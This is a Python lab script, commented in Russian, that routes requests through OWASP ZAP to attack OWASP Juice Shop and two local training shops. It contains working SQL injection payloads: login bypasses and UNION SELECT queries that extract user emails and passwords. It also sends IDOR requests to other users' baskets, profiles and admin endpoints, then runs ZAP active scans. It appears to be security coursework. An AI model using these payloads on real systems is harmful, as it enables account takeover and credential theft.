"""Часть 3 / 4.2: моделирование OWASP Top 10 через прокси OWASP ZAP.

Все запросы идут через ZAP (daemon, API на 127.0.0.1:8090), поэтому каждая пара
запрос/ответ сохраняется в истории ZAP; затем дампы выгружаются из ZAP API в файлы.

Цели: OWASP Juice Shop (http://localhost:3000), ENU Lab Shop v1 (:5001) и v2 (:5002).
Запуск: python owasp_zap_lab.py <каталог-результатов>
"""
import json
import os
import sys
import time

import requests

ZAP = "http://127.0.0.1:8090"
PROXIES = {"http": ZAP, "https": ZAP}
OUT = sys.argv[1]
os.makedirs(os.path.join(OUT, "dumps"), exist_ok=True)
JUICE, V1, V2 = "http://localhost:3000", "http://localhost:5001", "http://localhost:5002"
log_lines = []


def log(msg):
    print(msg)
    log_lines.append(msg)


def zap(path, **params):
    r = requests.get(f"{ZAP}/JSON/{path}/", params=params, timeout=600)
    r.raise_for_status()
    return r.json()


def send(name, method, url, **kw):
    """Отправить запрос через ZAP и сохранить дамп из истории ZAP."""
    r = requests.request(method, url, proxies=PROXIES, timeout=30, **kw)
    time.sleep(0.5)
    msgs = zap("core/view/messages", baseurl=url.split("?")[0], start=0, count=9999)["messages"]
    m = msgs[-1]
    body = m["responseBody"]
    if len(body) > 3000:
        body = body[:3000] + f"\n... [обрезано, всего {len(m['responseBody'])} байт]"
    dump = f"### {name}\n# ZAP history id: {m['id']}\n\n{m['requestHeader']}{m['requestBody']}\n\n{m['responseHeader']}{body}\n"
    with open(os.path.join(OUT, "dumps", f"{name}.txt"), "w", encoding="utf-8") as f:
        f.write(dump)
    log(f"[{r.status_code}] {name}: {method} {url}")
    return r


def token_of(r):
    try:
        j = r.json()
        return j.get("authentication", {}).get("token") or j.get("token")
    except ValueError:
        return None


def wait_up(url):
    for _ in range(90):
        try:
            requests.get(url, timeout=3)
            return
        except requests.RequestException:
            time.sleep(2)
    raise SystemExit(f"{url} не отвечает")


for u in (ZAP, JUICE, V1, V2):
    wait_up(u)
zap("core/action/newSession", name="pr6", overwrite="true")

# ===================== Вектор А: A03 Injection (SQLi) =====================
log("\n== A03 Injection: Juice Shop ==")
send("A03_juice_1_login_normal", "POST", f"{JUICE}/rest/user/login",
     json={"email": "nosuchuser@juice-sh.op", "password": "wrong"})
send("A03_juice_2_login_quote", "POST", f"{JUICE}/rest/user/login",
     json={"email": "'", "password": "x"})
r = send("A03_juice_3_login_bypass", "POST", f"{JUICE}/rest/user/login",
         json={"email": "' OR 1=1--", "password": "x"})
admin_token = token_of(r)
log(f"  токен после обхода аутентификации получен: {bool(admin_token)}")
send("A03_juice_4_search_union", "GET",
     f"{JUICE}/rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--")

log("\n== A03 Injection: ENU Lab Shop v1 / v2 ==")
for tag, base in (("v1", V1), ("v2", V2)):
    send(f"A03_lab_{tag}_1_login_bypass", "POST", f"{base}/api/login",
         json={"username": "admin' --", "password": "x"})
    send(f"A03_lab_{tag}_2_search_union", "GET",
         f"{base}/api/products?q=zzz'%20UNION%20SELECT%20id,username,password,role%20FROM%20users--")

# ===================== Вектор Б: A01 Broken Access Control (IDOR) =====================
log("\n== A01 Broken Access Control: Juice Shop ==")
email = f"student{int(time.time())}@lab.local"
send("A01_juice_0_register", "POST", f"{JUICE}/api/Users",
     json={"email": email, "password": "Student#2026", "passwordRepeat": "Student#2026",
           "securityQuestion": {"id": 1}, "securityAnswer": "lab"})
r = send("A01_juice_1_login_user", "POST", f"{JUICE}/rest/user/login",
         json={"email": email, "password": "Student#2026"})
utok = token_of(r)
bid = r.json()["authentication"]["bid"]
H = {"Authorization": f"Bearer {utok}"}
send("A01_juice_2_own_basket", "GET", f"{JUICE}/rest/basket/{bid}", headers=H)
send("A01_juice_3_foreign_basket_1", "GET", f"{JUICE}/rest/basket/1", headers=H)
send("A01_juice_4_foreign_basket_2", "GET", f"{JUICE}/rest/basket/2", headers=H)
send("A01_juice_5_users_list", "GET", f"{JUICE}/api/Users", headers=H)

log("\n== A01 Broken Access Control: ENU Lab Shop v1 / v2 ==")
for tag, base in (("v1", V1), ("v2", V2)):
    r = send(f"A01_lab_{tag}_1_login_aliya", "POST", f"{base}/api/login",
             json={"username": "aliya", "password": "Aliya#2026"})
    H = {"Authorization": f"Bearer {token_of(r)}"}
    send(f"A01_lab_{tag}_2_own_profile", "GET", f"{base}/api/users/2", headers=H)
    send(f"A01_lab_{tag}_3_foreign_profile", "GET", f"{base}/api/users/3", headers=H)
    send(f"A01_lab_{tag}_4_foreign_order", "GET", f"{base}/api/orders/2", headers=H)
    send(f"A01_lab_{tag}_5_admin_users", "GET", f"{base}/api/admin/users", headers=H)

# ===================== Автоматическое сканирование (Automated Scan) =====================
for tag, target, minutes in (("juice", JUICE, 8), ("lab_v1", V1, 3), ("lab_v2", V2, 3)):
    log(f"\n== ZAP spider + active scan: {target} ==")
    sid = zap("spider/action/scan", url=target, maxChildren=30, recurse="true")["scan"]
    while int(zap("spider/view/status", scanId=sid)["status"]) < 100:
        time.sleep(3)
    if tag.startswith("lab"):
        for p in ("/api/products?q=usb", "/api/users/1", "/api/orders/1", "/api/admin/users"):
            try:
                requests.get(target + p, proxies=PROXIES, timeout=10)
            except requests.RequestException:
                pass
    zap("ascan/action/setOptionMaxScanDurationInMins", Integer=minutes)
    aid = zap("ascan/action/scan", url=target, recurse="true")["scan"]
    while int(zap("ascan/view/status", scanId=aid)["status"]) < 100:
        time.sleep(10)
    alerts = zap("core/view/alerts", baseurl=target, start=0, count=5000)["alerts"]
    with open(os.path.join(OUT, f"zap_alerts_{tag}.json"), "w", encoding="utf-8") as f:
        json.dump(alerts, f, ensure_ascii=False, indent=1)
    summary = {}
    for a in alerts:
        key = (a["risk"], a["alert"], a.get("cweid"))
        summary[key] = summary.get(key, 0) + 1
    order = {"High": 0, "Medium": 1, "Low": 2, "Informational": 3}
    with open(os.path.join(OUT, f"zap_summary_{tag}.txt"), "w", encoding="utf-8") as f:
        for (risk, name, cwe), n in sorted(summary.items(), key=lambda x: (order.get(x[0][0], 9), x[0][1])):
            line = f"{risk:<14} {name} (CWE-{cwe}) — {n} шт."
            f.write(line + "\n")
            log("  " + line)

html = requests.get(f"{ZAP}/OTHER/core/other/htmlreport/", timeout=120).text
with open(os.path.join(OUT, "zap_report.html"), "w", encoding="utf-8") as f:
    f.write(html)
with open(os.path.join(OUT, "zap_lab_log.txt"), "w", encoding="utf-8") as f:
    f.write("\n".join(log_lines) + "\n")
print("done")
